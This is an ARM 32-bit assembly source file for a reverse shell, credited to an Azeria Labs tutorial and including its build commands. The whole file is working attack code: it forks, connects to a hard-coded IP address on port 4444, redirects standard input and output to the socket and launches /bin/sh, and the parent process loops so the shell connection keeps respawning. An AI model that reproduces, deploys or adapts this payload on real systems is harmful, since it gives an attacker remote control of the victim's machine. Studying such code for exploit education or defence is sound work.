// ref : https://azeria-labs.com/tcp-reverse-shell-in-assembly-arm-32-bit/
// arm-linux-gnueabi-as ./reverse.s -o ./reverse.o
// arm-linux-gnueabi-ld ./reverse.o -N -o ./reverse
.section .text
.global _start
_start:
 ADD R3, PC, #1	//Switching to Thumb mode
 BX R3
.THUMB
start:
 mov   r7, #2 //fork 
 mov   r0, #0
 mov   r1, #0
 svc   #1
 mov   r4, r0
 cmp   r4, #0
 bne   parent
child:
// socket(2, 1, 0) 
 mov   r0, #2
 mov   r1, #1
 sub   r2, r2
 mov   r7, #200
 add   r7, #81         // r7 = 281 (socket) 
 svc   #1              // r0 = resultant sockfd 
 mov   r4, r0          // save sockfd in r4 

// connect(r0, &sockaddr, 16) 
 adr   r1, struct        // pointer to address, port 
 strb  r2, [r1, #1]    // write 0 for AF_INET 
 mov   r2, #16
 add   r7, #2          // r7 = 283 (connect) 
 svc   #1

// dup2(sockfd, 0) 
 mov   r7, #63         // r7 = 63 (dup2) 
 mov   r0, r4          // r4 is the saved sockfd 
 sub   r1, r1          // r1 = 0 (stdin) 
 svc   #1
// dup2(sockfd, 1) 
 mov   r0, r4          // r4 is the saved sockfd 
 mov   r1, #1          // r1 = 1 (stdout) 
 svc   #1
// dup2(sockfd, 2) 
 mov   r0, r4         // r4 is the saved sockfd 
 mov   r1, #2         // r1 = 2 (stderr)
 svc   #1
// for test
// mov   r0, r4
// adr   r1, binsh
// mov   r2, #0x10
// mov   r7, #4
// svc   #1 
// execve("/bin/sh", ["/bin/sh"], 0) 
 adr  r0, binsh
 eor  r2, r2, r2
 push {r0, r2}
 mov  r1, sp
 mov  r7, #11
 svc  #1

parent:
 mov r7, #114
 mov r1,#0
 mov r2,#0
 mov r3,#0
 svc #1 //wait child finish
 b start

pad:
.byte 0,0
struct:
.ascii "\x02\xff"      // AF_INET 0xff will be NULLed 
.ascii "\x11\x5c"      // port number 4444 
.byte 192,168,214,7  // IP Address 
binsh:
.ascii "/bin/sh"
